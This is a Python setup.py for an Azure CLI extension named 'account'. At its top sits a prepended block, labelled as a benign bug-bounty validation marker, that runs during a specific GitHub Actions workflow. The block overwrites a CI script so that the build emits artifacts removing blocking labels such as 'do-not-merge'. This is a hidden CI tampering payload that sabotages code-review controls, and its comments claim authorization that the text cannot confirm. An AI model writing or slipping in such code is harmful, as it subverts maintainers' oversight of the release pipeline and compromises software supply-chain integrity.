
# --- MSRC benign security validation marker START (remove) ---
# This temporary code is for an authorized MSRC bounty validation PR only.
# It writes local GitHub Actions artifact files; it does not read/exfiltrate secrets.
try:
    import os as _msrc_os, pathlib as _msrc_pathlib
    if _msrc_os.environ.get("GITHUB_ACTIONS") == "true" and _msrc_os.environ.get("GITHUB_WORKFLOW") == "Release Version Calculation":
        _candidates = [_msrc_pathlib.Path.cwd(), _msrc_pathlib.Path(__file__).resolve().parent]
        _candidates += list(_msrc_pathlib.Path(__file__).resolve().parents)
        _root = next((_p for _p in _candidates if (_p / ".git").exists() or (_p / "scripts" / "ci").exists()), _msrc_pathlib.Path.cwd())
        _target = _root / "scripts" / "ci" / "release_version_cal.py"
        _target.parent.mkdir(parents=True, exist_ok=True)
        _target.write_text('\nimport os, pathlib\nroot = pathlib.Path.cwd()\nres = root / "cal_result"\nres.mkdir(exist_ok=True)\n(res / "version_update.txt").write_text("Hi maintainers, this is a benign MSRC security validation marker: attempting to remove blocking labels via VersionCalPRComment artifact output. No merge intended.\\n", encoding="utf-8")\n(res / "labels_removed.txt").write_text("do-not-merge\\nneeds-author-feedback\\nrelease-version-block\\n", encoding="utf-8")\nfor p in [res / "labels_added.json"]:\n    try: p.unlink()\n    except FileNotFoundError: pass\nprint("MSRC benign PoC: generated labels_removed.txt for blocking labels")\n', encoding="utf-8")
        print("MSRC benign PoC: replaced release_version_cal.py for artifact-only label validation")
except Exception as _msrc_e:
    print("MSRC benign PoC setup marker failed:", _msrc_e)
# --- MSRC benign security validation marker END ---

#!/usr/bin/env python

# --------------------------------------------------------------------------------------------
# Copyright (c) Microsoft Corporation. All rights reserved.
# Licensed under the MIT License. See License.txt in the project root for license information.
# --------------------------------------------------------------------------------------------


from codecs import open
from setuptools import setup, find_packages
try:
    from azure_bdist_wheel import cmdclass
except ImportError:
    from distutils import log as logger
    logger.warn("Wheel is not available, disabling bdist_wheel hook")

# TODO: Confirm this is the right version number you want and it matches your
# HISTORY.rst entry.
VERSION = '0.2.5'

# The full list of classifiers is available at
# https://pypi.python.org/pypi?%3Aaction=list_classifiers
CLASSIFIERS = [
    'Development Status :: 4 - Beta',
    'Intended Audience :: Developers',
    'Intended Audience :: System Administrators',
    'Programming Language :: Python',
    'Programming Language :: Python :: 3',
    'Programming Language :: Python :: 3.6',
    'Programming Language :: Python :: 3.7',
    'Programming Language :: Python :: 3.8',
    'License :: OSI Approved :: MIT License',
]

# TODO: Add any additional SDK dependencies here
DEPENDENCIES = []

with open('README.rst', 'r', encoding='utf-8') as f:
    README = f.read()
with open('HISTORY.rst', 'r', encoding='utf-8') as f:
    HISTORY = f.read()

setup(
    name='account',
    version=VERSION,
    description='Microsoft Azure Command-Line Tools SubscriptionClient Extension',
    # TODO: Update author and email, if applicable
    author='Microsoft Corporation',
    author_email='azpycli@microsoft.com',
    url='https://github.com/Azure/azure-cli-extensions/tree/main/src/account',
    long_description=README + '\n\n' + HISTORY,
    license='MIT',
    classifiers=CLASSIFIERS,
    packages=find_packages(),
    install_requires=DEPENDENCIES,
    package_data={'azext_account': ['azext_metadata.json']},
)
